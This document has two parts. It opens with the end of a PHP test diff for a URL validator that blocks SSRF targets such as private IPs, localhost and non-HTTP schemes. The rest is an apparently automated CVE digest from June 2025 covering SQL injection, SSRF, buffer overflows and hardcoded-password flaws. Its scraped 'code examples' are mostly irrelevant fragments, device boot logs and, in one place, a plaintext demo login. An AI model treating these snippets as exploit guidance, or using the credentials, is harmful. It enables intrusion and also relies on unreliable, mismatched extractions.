+		self::assertEquals('photo_url must be a valid HTTP or HTTPS URL.', $this->failMessage);
+	}
+
+	/**
+	 * Test validation when forbidden ports are configured and non-standard port is used.
+	 */
+	public function testForbiddenPort(): void
+	{
+		$this->rule->validate('photo_url', 'https://example.com:8080', fn ($m) => $this->m($m));
+		self::assertTrue($this->failCalled);
+		self::assertEquals('photo_url must use a valid port such as 80 or 443.', $this->failMessage);
+	}
+
+	/**
+	 * Test validation when forbidden ports are configured but standard port is used.
+	 */
+	public function testAllowedPort(): void
+	{
+		$this->rule->validate('photo_url', 'https://example.com:80', function ($message) {
+			$this->failCalled = true;
+		});
+
+		self::assertFalse($this->failCalled);
+		self::assertEquals('', $this->failMessage);
+	}
+
+	/**
+	 * Test validation when private IP addresses are forbidden and private IP is provided.
+	 */
+	public function testForbiddenPrivateIp(): void
+	{
+		$this->rule->validate('photo_url', 'https://192.168.1.1', fn ($m) => $this->m($m));
+		self::assertTrue($this->failCalled);
+		self::assertEquals('photo_url must not be a private IP address.', $this->failMessage);
+	}
+
+	/**
+	 * Test validation when localhost is forbidden and localhost is provided.
+	 */
+	public function testForbiddenLocalhost(): void
+	{
+		$this->rule->validate('photo_url', 'https://localhost', fn ($m) => $this->m($m));
+		self::assertTrue($this->failCalled);
+		self::assertEquals('photo_url must not be localhost.', $this->failMessage);
+	}
+
+	/**
+	 * Test validation with a valid URL when all restrictions are disabled.
+	 */
+	public function testValidUrlWithNoRestrictionsWrongScheme(): void
+	{
+		Configs::set('import_via_url_require_https', '0');
+		Configs::set('import_via_url_forbidden_ports', '0');
+		Configs::set('import_via_url_forbidden_local_ip', '0');
+		Configs::set('import_via_url_forbidden_localhost', '0');
+		Configs::invalidateCache();
+		$this->rule->validate('photo_url', 'ssh://192.168.0.1:5432', fn ($m) => $this->m($m));
+
+		self::assertTrue($this->failCalled);
+		self::assertEquals('photo_url must be a valid HTTP or HTTPS URL.', $this->failMessage);
+	}
+
+	/**
+	 * Test validation with a valid URL when all restrictions are disabled.
+	 */
+	public function testValidUrlWithNoRestrictionsCorrectScheme(): void
+	{
+		Configs::set('import_via_url_require_https', '0');
+		Configs::set('import_via_url_forbidden_ports', '0');
+		Configs::set('import_via_url_forbidden_local_ip', '0');
+		Configs::set('import_via_url_forbidden_localhost', '0');
+		Configs::invalidateCache();
+		$this->rule->validate('photo_url', 'http://192.168.0.1:5432', fn ($m) => $this->m($m));
+
+		self::assertFalse($this->failCalled);
+		self::assertEquals('', $this->failMessage);
+	}
+}
diff --git a/version.md b/version.md
index 44fd005dc44..2ac35216401 100644
--- a/version.md
+++ b/version.md
@@ -1 +1 @@
-6.6.12
\ No newline at end of file
+6.6.13
\ No newline at end of file


================================================================================


CVE ID: CVE-2025-40910
Published: 2025-06-27T13:15:24.667
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N

CWE Categories:
  - CWE-1287: CWE-1287

Description:
Net::IP::LPM version 1.10 for Perl does not properly consider leading zero characters in IP CIDR address strings, which could allow attackers to bypass access control that is based on IP addresses.

Leading zeros are used to indicate octal numbers, which can confuse users who are intentionally using octal notation, as well as users who believe they are using decimal notation.

References (3):
  1. https://blog.urth.org/2021/03/29/security-issues-in-perl-ip-address-distros/
  2. https://metacpan.org/release/TPODER/Net-IP-LPM-1.10/diff/TPODER/Net-IP-LPM-1.09/lib/Net/IP/LPM.pm
  3. https://security.metacpan.org/patches/N/Net-IP-LPM/1.10/CVE-2025-40910-r1.patch

Attempting to extract code examples from references...

--- Code from https://blog.urth.org/2021/03/29/security-issues-in-perl-ip-address-distros/ ---
netmask

010.0.0.1

010.0.0.0/8

================================================================================


CVE ID: CVE-2025-6762
Published: 2025-06-27T12:15:45.280
Modified: 2025-09-02T18:09:56.620
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-918: Server-Side Request Forgery (SSRF)

Description:
A vulnerability classified as critical has been found in diyhi bbs up to 6.8. This affects the function getUrl of the file /admin/login of the component HTTP Header Handler. The manipulation of the argument Host leads to server-side request forgery. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250618-02.md [Exploit]
  2. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250618-02.md#steps-to-reproduce [Exploit]
  3. https://vuldb.com/?ctiid.314073 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314073 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.598896 [Third Party Advisory, VDB Entry]
  6. https://github.com/ShenxiuSec/cve-proofs/blob/main/POC-20250618-02.md [Exploit]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314073 ---
getUrl

getUrl

Host

================================================================================


CVE ID: CVE-2025-6761
Published: 2025-06-27T11:15:25.740
Modified: 2025-06-30T18:38:48.477
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-791: CWE-791
  - CWE-1336: CWE-1336

Description:
A vulnerability was found in Kingdee Cloud-Starry-Sky Enterprise Edition 6.x/7.x/8.x/9.0. It has been rated as critical. Affected by this issue is the function plugin.buildMobilePopHtml of the file \k3\o2o\bos\webapp\action\DynamicForm 4 Action.class of the component Freemarker Engine. The manipulation leads to improper neutralization of special elements used in a template engine. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. It is recommended to upgrade the affected component. The vendor explains, that in the fixed release "Freemarker is set to 'ALLOWS_NOTHING_RESOLVER' to not parse any classes."

References (5):
  1. https://vip.kingdee.com/link/s/ZlWX7
  2. https://vip.kingdee.com/school/detail/713028702245944320
  3. https://vuldb.com/?ctiid.314072
  4. https://vuldb.com/?id.314072
  5. https://vuldb.com/?submit.601207

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314072 ---
plugin.buildMobilePopHtml

plugin.buildMobilePopHtml

================================================================================


CVE ID: CVE-2024-12827
Published: 2025-06-27T09:15:24.300
Modified: 2025-06-30T18:38:48.477
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-620: CWE-620

Description:
The DWT - Directory & Listing WordPress Theme theme for WordPress is vulnerable to privilege escalation via account takeover in all versions up to, and including, 3.3.6. This is due to the plugin not properly checking for an empty token value prior to resetting a user's password through the dwt_listing_reset_password() function. This makes it possible for unauthenticated attackers to change arbitrary user's passwords, including administrators, and leverage that to gain access to their account.

References (2):
  1. https://themeforest.net/item/dwt-listing-directory-listing-wordpress-theme/21976132
  2. https://www.wordfence.com/threat-intel/vulnerabilities/id/51fc7d47-2a0f-4713-9859-120321aa32dc?source=cve

Attempting to extract code examples from references...

--- Code from https://themeforest.net/item/dwt-listing-directory-listing-wordpress-theme/21976132 ---

Email: melisa@gmail.com
Password:  admin



Fixed:
 1. Fixed the Map issue on the Event search page.
 2. Fixed Review not posting in other languages (WPML).
 3. Fixed the Favorite listing not showing in the second language (WMPL).
 4. Fixed the Custom location widget to work.
 5. Fixed the TikTok icon issue in the Footer.
 6. Fixed the Pagination issue on the listing page.
 7. Filter on the search page (Fixed)
 8. Fixed the Map location issue while posting a listing.
 9. Fixed ReCAPTCHA upon registration.
10. Fixed user-reported issue.
11. Fixed styling issues.

Update:

1. Update all the required plugins.
2. Updated WooCommerce outdated version.



Fixed:
1. Fixed an issue with incorrect cost range display.
2. Resolved map switching functionality.
3. Addressed pagination inconsistencies across listing pages.
4. Corrected URL formatting and redirection issues on the listing detail page.
5. Fixed custom location behavior issues.
6. Fixed Google Map MapId configuration issue.
7. Resolved all reported Google Maps-related issues.
8. Fixed clustering and map pin display problems.
9. Addressed cluster and pin inconsistencies caused by pagination.
10. Fixed the issue where the map was not regenerating correctly after pagination.
11. Security issues addressed.

Update:
1. Updated all theme plugins.
2. Checked with the latest WordPress.
3) Style files updated


================================================================================


CVE ID: CVE-2025-6753
Published: 2025-06-27T05:15:34.450
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in huija bicycleSharingServer 1.0 and classified as critical. This issue affects the function selectAdminByNameLike of the file AdminController.java. The manipulation leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (4):
  1. https://github.com/huija/bicycleSharingServer/issues/4
  2. https://vuldb.com/?ctiid.314051
  3. https://vuldb.com/?id.314051
  4. https://vuldb.com/?submit.597982

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314051 ---
selectAdminByNameLike

selectAdminByNameLike

================================================================================


CVE ID: CVE-2025-6488
Published: 2025-06-27T05:15:34.203
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
The isMobile plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the ‘device’ parameter in all versions up to, and including, 1.1.1 due to insufficient input sanitization and output escaping. This makes it possible for authenticated attackers, with Contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

References (3):
  1. https://plugins.trac.wordpress.org/changeset/3318334/
  2. https://wordpress.org/plugins/ismobile/#developers
  3. https://www.wordfence.com/threat-intel/vulnerabilities/id/b1886db3-e01d-4cb1-8134-8cddff6503ac?source=cve

Attempting to extract code examples from references...

--- Code from https://wordpress.org/plugins/ismobile/#developers ---
<code>[ismobile device='iphone' debug=true ] Your content [/ismobile]


================================================================================


CVE ID: CVE-2025-45737
Published: 2025-06-27T05:15:33.223
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L

CWE Categories:
  - CWE-269: Improper Privilege Management

Description:
An issue in NetEase (Hangzhou) Network Co., Ltd NeacSafe64 Driver before v1.0.0.8 allows attackers to escalate privileges via sending crafted IOCTL commands to the NeacSafe64.sys component.

References (1):
  1. https://github.com/za233/NeacController

Attempting to extract code examples from references...

--- Code from https://github.com/za233/NeacController ---
ret

0xCC

STATUS_BREAKPOINT

================================================================================


CVE ID: CVE-2025-6752
Published: 2025-06-27T04:16:01.407
Modified: 2025-06-30T18:38:48.477
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability has been found in Linksys WRT1900ACS, EA7200, EA7450 and EA7500 up to 20250619 and classified as critical. This vulnerability affects the function SetDefaultConnectionService of the file /upnp/control/Layer3Forwarding of the component IGD. The manipulation of the argument NewDefaultConnectionService leads to stack-based buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/feiwuxingxie/cve/blob/main/linksys/vul01/1.md
  2. https://github.com/feiwuxingxie/cve/blob/main/linksys/vul01/1.md#poc
  3. https://vuldb.com/?ctiid.314050
  4. https://vuldb.com/?id.314050
  5. https://vuldb.com/?submit.600638
  6. https://www.linksys.com/

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314050 ---
SetDefaultConnectionService

SetDefaultConnectionService

NewDefaultConnectionService

================================================================================


CVE ID: CVE-2025-6751
Published: 2025-06-27T04:15:56.977
Modified: 2025-06-30T18:38:48.477
CVSS Score: 8.8 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')

Description:
A vulnerability, which was classified as critical, was found in Linksys E8450 up to 1.2.00.360516. This affects the function set_device_language of the file portal.cgi of the component HTTP POST Request Handler. The manipulation of the argument dut_language leads to buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

References (6):
  1. https://github.com/CH13hh/tmp_store_cc/blob/main/E8450/1.md
  2. https://github.com/CH13hh/tmp_store_cc/blob/main/E8450/1.md#poc
  3. https://vuldb.com/?ctiid.314049
  4. https://vuldb.com/?id.314049
  5. https://vuldb.com/?submit.598217
  6. https://www.linksys.com/

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314049 ---
set_device_language

set_device_language

dut_language

================================================================================


CVE ID: CVE-2025-6750
Published: 2025-06-27T03:15:22.827
Modified: 2025-07-01T17:44:05.567
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-122: CWE-122

Description:
A vulnerability, which was classified as problematic, has been found in HDF5 1.14.6. Affected by this issue is the function H5O__mtime_new_encode of the file src/H5Omtime.c. The manipulation leads to heap-based buffer overflow. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/HDFGroup/hdf5/issues/5549 [Exploit, Issue Tracking]
  2. https://github.com/user-attachments/files/20438441/hdf5_crash_1.txt [Exploit]
  3. https://vuldb.com/?ctiid.314048 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314048 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.601017 [Third Party Advisory, VDB Entry]
  6. https://github.com/HDFGroup/hdf5/issues/5549 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5549 ---
H5O__mtime_new_encode

src/H5Omtime.c:237:10

H5O__mtime_new_encode

================================================================================


CVE ID: CVE-2025-47824
Published: 2025-06-27T03:15:22.650
Modified: 2025-10-01T14:27:51.550
CVSS Score: 2.0 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-312: Cleartext Storage of Sensitive Information

Description:
Flock Safety LPR (License Plate Reader) devices with firmware through 2.2 have cleartext storage of code.

References (4):
  1. https://gainsec.com/2025/06/19/bird-hunting-season-security-research-on-flock-safety-anti-crime-systems/ [Third Party Advisory]
  2. https://gainsec.com/2025/06/19/grounded-flight-device-2-root-shell-on-flock-safetys-falcon-sparrow-automated-license-plate-reader/ [Third Party Advisory]
  3. https://gainsec.com/wp-content/uploads/2025/06/flock-safety-researcher-summary.pdf [Third Party Advisory, Technical Description]
  4. https://www.flocksafety.com/articles/gunshot-detection-and-license-plate-reader-security-alert [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://gainsec.com/2025/06/19/grounded-flight-device-2-root-shell-on-flock-safetys-falcon-sparrow-automated-license-plate-reader/ ---
fastboot devices

fastboot recovery reboot

adb reboot edl

================================================================================


CVE ID: CVE-2025-47823
Published: 2025-06-27T03:15:22.487
Modified: 2025-10-01T14:36:15.407
CVSS Score: 2.2 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N

CWE Categories:
  - CWE-259: CWE-259

Description:
Flock Safety LPR (License Plate Reader) devices with firmware through 2.2 have a hardcoded password for a system.

References (4):
  1. https://gainsec.com/2025/06/19/bird-hunting-season-security-research-on-flock-safety-anti-crime-systems/ [Third Party Advisory]
  2. https://gainsec.com/2025/06/19/grounded-flight-device-2-root-shell-on-flock-safetys-falcon-sparrow-automated-license-plate-reader/ [Third Party Advisory]
  3. https://gainsec.com/wp-content/uploads/2025/06/flock-safety-researcher-summary.pdf [Third Party Advisory, Technical Description]
  4. https://www.flocksafety.com/articles/gunshot-detection-and-license-plate-reader-security-alert [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://gainsec.com/2025/06/19/grounded-flight-device-2-root-shell-on-flock-safetys-falcon-sparrow-automated-license-plate-reader/ ---
fastboot devices

fastboot recovery reboot

adb reboot edl

================================================================================


CVE ID: CVE-2025-47822
Published: 2025-06-27T03:15:22.323
Modified: 2025-09-02T17:15:35.297
CVSS Score: 6.4 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-1191: CWE-1191

Description:
Flock Safety LPR (License Plate Reader) devices with firmware through 2.2 have an on-chip debug interface with improper access control.

References (4):
  1. https://gainsec.com/2025/06/19/bird-hunting-season-security-research-on-flock-safety-anti-crime-systems/
  2. https://gainsec.com/2025/06/19/grounded-flight-device-2-root-shell-on-flock-safetys-falcon-sparrow-automated-license-plate-reader/
  3. https://gainsec.com/wp-content/uploads/2025/06/flock-safety-researcher-summary.pdf
  4. https://www.flocksafety.com/articles/gunshot-detection-and-license-plate-reader-security-alert

Attempting to extract code examples from references...

--- Code from https://gainsec.com/2025/06/19/grounded-flight-device-2-root-shell-on-flock-safetys-falcon-sparrow-automated-license-plate-reader/ ---
fastboot devices

fastboot recovery reboot

adb reboot edl

================================================================================


CVE ID: CVE-2025-47821
Published: 2025-06-27T03:15:22.160
Modified: 2025-09-02T17:15:35.160
CVSS Score: 2.2 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N

CWE Categories:
  - CWE-259: CWE-259

Description:
Flock Safety Gunshot Detection devices before 1.3 have a hardcoded password for a system.

References (4):
  1. https://gainsec.com/2025/06/19/bird-hunting-season-security-research-on-flock-safety-anti-crime-systems/
  2. https://gainsec.com/2025/06/19/plucked-and-rooted-device-1-debug-shell-on-flock-safetys-raven-gunshot-detection-system/
  3. https://gainsec.com/wp-content/uploads/2025/06/flock-safety-researcher-summary.pdf
  4. https://www.flocksafety.com/articles/gunshot-detection-and-license-plate-reader-security-alert

Attempting to extract code examples from references...

--- Code from https://gainsec.com/2025/06/19/plucked-and-rooted-device-1-debug-shell-on-flock-safetys-raven-gunshot-detection-system/ ---
I (5306) RAVEN_NDP: chip: NDP120-B0
I (5318) RAVEN_NDP: package version: 1.9.7
I (5321) RAVEN_NDP: firmware version: 76.3.0
I (5323) RAVEN_NDP: parameters version:
I (5325) RAVEN_NDP: number of classes: 3
I (5337) RAVEN_NDP: number of labels: 3
I (5340) RAVEN_NDP: labels:
I (5341) RAVEN_NDP:  NN0:gunshot
I (5343) RAVEN_NDP:  NN0:tire
I (5345) RAVEN_NDP:  NN0:background
I (5359) RAVEN_NDP: syntiant_ndp120_dsp_flow_setup_get succeeded with a value 

I (0) cpu_start: Starting scheduler on APP CPU.
I (2491) spiram: Reserving pool of 32K of internal memory for DMA/internal alloc                                                                          ations
W (2504) RTC_STATE: Initializing RTC state on CRC mismatch
I (2582) RAVEN_NVS: Loaded consoleLogEn in load_from_nvs
ets Jun  8 2016 00:22:57
rst:0x5 (DEEPSLEEP_RESET),boot:0x13 (SPI_FAST_FLASH_BOOT)
configsip: 0, SPIWP:0xee
clk_drv:0x00,q_drv:0x00,d_drv:0x00,cs0_drv:0x00,hd_drv:0x00,wp_drv:0x00
mode:DIO, clock div:2
load:0x3fff0030,len:5832
load:0x40078000,len:15380
load:0x40080400,len:3672
entry 0x40080674
I (27) boot: ESP-IDF HEAD-HASH-NOTFOUND 2nd stage bootloader
I (27) boot: compile time 01:09:33
I (27) boot: chip revision: 1
I (31) boot_comm: chip revision: 1, min. bootloader chip revision: 0
I (38) boot.esp32: SPI Speed      : 40MHz
I (43) boot.esp32: SPI Mode       : DIO
I (47) boot.esp32: SPI Flash Size : 16MB
I (52) boot: Enabling RNG early entropy source...
I (57) boot: Partition Table:
I (61) boot: ## Label            Usage          Type ST Offset   Length
I (68) boot:  0 nvs              WiFi data        01 02 00009000 00004000
I (76) boot:  1 otadata          OTA data         01 00 0000d000 00002000
I (83) boot:  2 phy_init         RF data          01 01 0000f000 00001000
I (91) boot:  3 ota_0            OTA app          00 10 00010000 00400000
I (98) boot:  4 ota_1            OTA app          00 11 00410000 00400000
I (106) boot:  5 storage          Unknown data     01 81 00810000 00150000
I (113) boot: End of partition table
I (118) boot_comm: chip revision: 1, min. application chip revision: 0
I (125) esp_image: segment 0: paddr=00010020 vaddr=3f400020 size=93260h (602720) map
I (351) esp_image: segment 1: paddr=000a3288 vaddr=3ffbdb60 size=08564h ( 34148) load
I (365) esp_image: segment 2: paddr=000ab7f4 vaddr=40080000 size=04824h ( 18468) load
I (373) esp_image: segment 3: paddr=000b0020 vaddr=400d0020 size=117a18h (1145368) map
I (787) esp_image: segment 4: paddr=001c7a40 vaddr=40084824 size=1a8d8h (108760) load
I (832) esp_image: segment 5: paddr=001e2320 vaddr=400c0000 size=00068h (   104)
I (832) esp_image: segment 6: paddr=001e2390 vaddr=50000000 size=00020h (    32)
I (853) boot: Loaded app from partition at offset 0x10000
I (853) boot: Disabling RNG early entropy source...
I (865) psram: This chip is ESP32-D0WD
I (866) spiram: Found 64MBit SPI RAM device
I (866) spiram: SPI RAM mode: flash 40m sram 40m
I (870) spiram: PSRAM initialized, cache is in low/high (2-core) mode.
I (878) cpu_start: Pro cpu up.
I (881) cpu_start: Starting app cpu, entry point is 0x400812dc
I (0) cpu_start: App cpu up.
I (1751) spiram: SPI SRAM memory test OK
I (2363) cpu_start: Pro cpu start user code
I (2363) cpu_start: cpu freq: 80000000
I (2363) cpu_start: Application information:
I (2366) cpu_start: Project name:     audio_event_detection
I (2372) cpu_start: App version:      fa9a3b8
I (2377) cpu_start: Compile time:     Aug 13 2024 01:09:24
I (2383) cpu_start: ELF file SHA256:  863740b704d3beae...
I (2389) cpu_start: ESP-IDF:          HEAD-HASH-NOTFOUND
I (2396) heap_init: Initializing. RAM available for dynamic allocation:
I (2403) heap_init: At 3FFAFF10 len 000000F0 (0 KiB): DRAM
I (2409) heap_init: At 3FFB6388 len 00001C78 (7 KiB): DRAM
I (2415) heap_init: At 3FFB9A20 len 00004108 (16 KiB): DRAM
I (2421) heap_init: At 3FFCE2C0 len 00011D40 (71 KiB): DRAM
I (2428) heap_init: At 3FFE0440 len 00003AE0 (14 KiB): D/IRAM
I (2434) heap_init: At 3FFE4350 len 0001BCB0 (111 KiB): D/IRAM
I (2441) heap_init: At 4009F0FC len 00000F04 (3 KiB): IRAM
I (2447) spiram: Adding pool of 4095K of external SPI memory to heap allocator
I (2456) spi_flash: detected chip: generic
I (2459) spi_flash: flash io: dio
I (2475) pm: Frequency switching config: CPU_MAX: 80, APB_MAX: 80, APB_MIN: 40, Light sleep: DISABLED
I (2476) cpu_start: Starting scheduler on PRO CPU.
I (0) cpu_start: Starting scheduler on APP CPU.
I (2491) spiram: Reserving pool of 32K of internal memory for DMA/internal allocations
W (2504) RTC_STATE: Initializing RTC state on warm boot, with matching CRC
I (2579) RAVEN_NVS: Loaded consoleLogEn in load_from_nvs

Loaded consoleLogEn in from load_from_nvs

================================================================================


CVE ID: CVE-2025-6749
Published: 2025-06-27T02:15:24.260
Modified: 2025-06-30T18:38:48.477
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in huija bicycleSharingServer up to 7b8a3ba48ad618604abd4797d2e7cf3b5ac7625a. Affected by this vulnerability is the function searchAdminMessageShow of the file AdminController.java. The manipulation of the argument Title leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. This product does not use versioning. This is why information about affected and unaffected releases are unavailable.

References (4):
  1. https://github.com/huija/bicycleSharingServer/issues/6
  2. https://vuldb.com/?ctiid.314047
  3. https://vuldb.com/?id.314047
  4. https://vuldb.com/?submit.598164

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314047 ---
searchAdminMessageShow

searchAdminMessageShow

title

================================================================================


CVE ID: CVE-2025-47820
Published: 2025-06-27T02:15:23.920
Modified: 2025-09-02T17:15:35.013
CVSS Score: 2.0 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-312: Cleartext Storage of Sensitive Information

Description:
Flock Safety Gunshot Detection devices before 1.3 have cleartext storage of code.

References (4):
  1. https://gainsec.com/2025/06/19/bird-hunting-season-security-research-on-flock-safety-anti-crime-systems/
  2. https://gainsec.com/2025/06/19/plucked-and-rooted-device-1-debug-shell-on-flock-safetys-raven-gunshot-detection-system/
  3. https://gainsec.com/wp-content/uploads/2025/06/flock-safety-researcher-summary.pdf
  4. https://www.flocksafety.com/articles/gunshot-detection-and-license-plate-reader-security-alert

Attempting to extract code examples from references...

--- Code from https://gainsec.com/2025/06/19/plucked-and-rooted-device-1-debug-shell-on-flock-safetys-raven-gunshot-detection-system/ ---
I (5306) RAVEN_NDP: chip: NDP120-B0
I (5318) RAVEN_NDP: package version: 1.9.7
I (5321) RAVEN_NDP: firmware version: 76.3.0
I (5323) RAVEN_NDP: parameters version:
I (5325) RAVEN_NDP: number of classes: 3
I (5337) RAVEN_NDP: number of labels: 3
I (5340) RAVEN_NDP: labels:
I (5341) RAVEN_NDP:  NN0:gunshot
I (5343) RAVEN_NDP:  NN0:tire
I (5345) RAVEN_NDP:  NN0:background
I (5359) RAVEN_NDP: syntiant_ndp120_dsp_flow_setup_get succeeded with a value 

I (0) cpu_start: Starting scheduler on APP CPU.
I (2491) spiram: Reserving pool of 32K of internal memory for DMA/internal alloc                                                                          ations
W (2504) RTC_STATE: Initializing RTC state on CRC mismatch
I (2582) RAVEN_NVS: Loaded consoleLogEn in load_from_nvs
ets Jun  8 2016 00:22:57
rst:0x5 (DEEPSLEEP_RESET),boot:0x13 (SPI_FAST_FLASH_BOOT)
configsip: 0, SPIWP:0xee
clk_drv:0x00,q_drv:0x00,d_drv:0x00,cs0_drv:0x00,hd_drv:0x00,wp_drv:0x00
mode:DIO, clock div:2
load:0x3fff0030,len:5832
load:0x40078000,len:15380
load:0x40080400,len:3672
entry 0x40080674
I (27) boot: ESP-IDF HEAD-HASH-NOTFOUND 2nd stage bootloader
I (27) boot: compile time 01:09:33
I (27) boot: chip revision: 1
I (31) boot_comm: chip revision: 1, min. bootloader chip revision: 0
I (38) boot.esp32: SPI Speed      : 40MHz
I (43) boot.esp32: SPI Mode       : DIO
I (47) boot.esp32: SPI Flash Size : 16MB
I (52) boot: Enabling RNG early entropy source...
I (57) boot: Partition Table:
I (61) boot: ## Label            Usage          Type ST Offset   Length
I (68) boot:  0 nvs              WiFi data        01 02 00009000 00004000
I (76) boot:  1 otadata          OTA data         01 00 0000d000 00002000
I (83) boot:  2 phy_init         RF data          01 01 0000f000 00001000
I (91) boot:  3 ota_0            OTA app          00 10 00010000 00400000
I (98) boot:  4 ota_1            OTA app          00 11 00410000 00400000
I (106) boot:  5 storage          Unknown data     01 81 00810000 00150000
I (113) boot: End of partition table
I (118) boot_comm: chip revision: 1, min. application chip revision: 0
I (125) esp_image: segment 0: paddr=00010020 vaddr=3f400020 size=93260h (602720) map
I (351) esp_image: segment 1: paddr=000a3288 vaddr=3ffbdb60 size=08564h ( 34148) load
I (365) esp_image: segment 2: paddr=000ab7f4 vaddr=40080000 size=04824h ( 18468) load
I (373) esp_image: segment 3: paddr=000b0020 vaddr=400d0020 size=117a18h (1145368) map
I (787) esp_image: segment 4: paddr=001c7a40 vaddr=40084824 size=1a8d8h (108760) load
I (832) esp_image: segment 5: paddr=001e2320 vaddr=400c0000 size=00068h (   104)
I (832) esp_image: segment 6: paddr=001e2390 vaddr=50000000 size=00020h (    32)
I (853) boot: Loaded app from partition at offset 0x10000
I (853) boot: Disabling RNG early entropy source...
I (865) psram: This chip is ESP32-D0WD
I (866) spiram: Found 64MBit SPI RAM device
I (866) spiram: SPI RAM mode: flash 40m sram 40m
I (870) spiram: PSRAM initialized, cache is in low/high (2-core) mode.
I (878) cpu_start: Pro cpu up.
I (881) cpu_start: Starting app cpu, entry point is 0x400812dc
I (0) cpu_start: App cpu up.
I (1751) spiram: SPI SRAM memory test OK
I (2363) cpu_start: Pro cpu start user code
I (2363) cpu_start: cpu freq: 80000000
I (2363) cpu_start: Application information:
I (2366) cpu_start: Project name:     audio_event_detection
I (2372) cpu_start: App version:      fa9a3b8
I (2377) cpu_start: Compile time:     Aug 13 2024 01:09:24
I (2383) cpu_start: ELF file SHA256:  863740b704d3beae...
I (2389) cpu_start: ESP-IDF:          HEAD-HASH-NOTFOUND
I (2396) heap_init: Initializing. RAM available for dynamic allocation:
I (2403) heap_init: At 3FFAFF10 len 000000F0 (0 KiB): DRAM
I (2409) heap_init: At 3FFB6388 len 00001C78 (7 KiB): DRAM
I (2415) heap_init: At 3FFB9A20 len 00004108 (16 KiB): DRAM
I (2421) heap_init: At 3FFCE2C0 len 00011D40 (71 KiB): DRAM
